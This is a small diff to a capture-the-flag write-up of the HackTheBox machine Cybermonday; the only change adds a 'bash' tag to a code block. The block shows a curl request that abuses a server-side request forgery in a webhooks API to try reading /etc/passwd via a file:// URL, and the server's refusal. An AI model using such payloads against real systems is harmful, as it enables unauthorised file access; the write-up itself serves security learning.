@@ -9,7 +9,7 @@
 [Composing Root Access](/writeups/machines/htb-cybermonday/7-composing-root-access)
 
 Now that we have the ability to [[ssrf|make the web server send requests for us]], the question is what to do with it. The first thing to try would be to [[local-file-inclusion|get files on the system]]:
-```
+```bash
 curl http://webhooks-api-beta.cybermonday.htb/webhooks/<your guid> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "file://etc/passwd", "method": "GET"}' -v
 
 {"status":"error","message":"Only http protocol is allowed"}
